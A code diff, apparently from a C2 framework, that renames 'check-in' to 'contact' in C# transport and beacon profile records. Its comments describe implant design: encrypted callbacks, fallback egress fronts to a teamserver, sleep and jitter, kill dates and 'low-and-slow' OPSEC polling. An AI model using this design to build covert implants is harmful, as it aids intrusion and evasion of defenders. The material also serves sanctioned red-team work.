@@ -75,22 +75,22 @@ public sealed record TransportProfile(
     public TransportEnvelope Envelope { get; init; } = Defaults.Envelope;
 
     /// <summary>
-    /// Whether the artifact's check-in bodies seal under the per-artifact
-    /// envelope key (architecture.md Sec 8/9): every envelope check-in POST
+    /// Whether the artifact's contact bodies seal under the per-artifact
+    /// envelope key (architecture.md Sec 8/9): every envelope contact POST
     /// and its response ride as AES-256-GCM ciphertext covering a fresh
     /// counter -- the application-layer authentication the web transports use
     /// instead of a TLS client certificate, and the confidentiality that lets
     /// the cleartext-http posture carry content. Defaults to
-    /// <see cref="Defaults.CheckInProtection"/> (on); off is the lab-debug
+    /// <see cref="Defaults.ContactProtection"/> (on); off is the lab-debug
     /// plaintext frame. Independent of <see cref="Envelope"/>, which shapes
     /// the enroll body only -- the two phases are two knobs.
     /// </summary>
-    public bool CheckInProtection { get; init; } = Defaults.CheckInProtection;
+    public bool ContactProtection { get; init; } = Defaults.ContactProtection;
 
     /// <summary>
     /// The ordered fallback egress endpoints baked in behind
     /// <see cref="Endpoint"/> (architecture.md Sec 8): when the primary burns
-    /// mid-engagement, the implant walks this list on failed check-ins instead of
+    /// mid-engagement, the implant walks this list on failed contacts instead of
     /// going silent. The list is a property of the transport profile because each
     /// entry is another front to the same teamserver. Empty -- the default --
     /// bakes the single-endpoint shape.
@@ -133,19 +133,19 @@ public sealed record TransportProfile(
             = new Dictionary<string, string>(StringComparer.Ordinal);
         public static readonly TimeSpan RequestTimeout = TimeSpan.FromSeconds(30);
         public const TransportEnvelope Envelope = TransportEnvelope.AesGcm;
-        public const bool CheckInProtection = true;
+        public const bool ContactProtection = true;
         public static readonly IReadOnlyList<string> FallbackEndpoints = Array.Empty<string>();
     }
 }
 
 /// <summary>
 /// The beacon profile baked into an implant at generation (architecture.md Sec 5.1,
-/// Sec 7): the check-in mode, the sleep interval, the jitter applied to each
-/// check-in, and the kill date past which the implant self-terminates. These are
+/// Sec 7): the contact mode, the sleep interval, the jitter applied to each
+/// contact, and the kill date past which the implant self-terminates. These are
 /// embedded into the artifact at build time so each implant is self-contained.
 /// </summary>
 /// <param name="Mode">
-/// How one check-in cycle uses the beacon stream: <c>stream</c> holds the
+/// How one contact cycle uses the beacon stream: <c>stream</c> holds the
 /// connection open (interactive, server-push tasking); <c>poll</c> drains
 /// queued tasking, closes, and sleeps the interval -- the low-and-slow OPSEC
 /// shape. Defaults to <c>stream</c>.
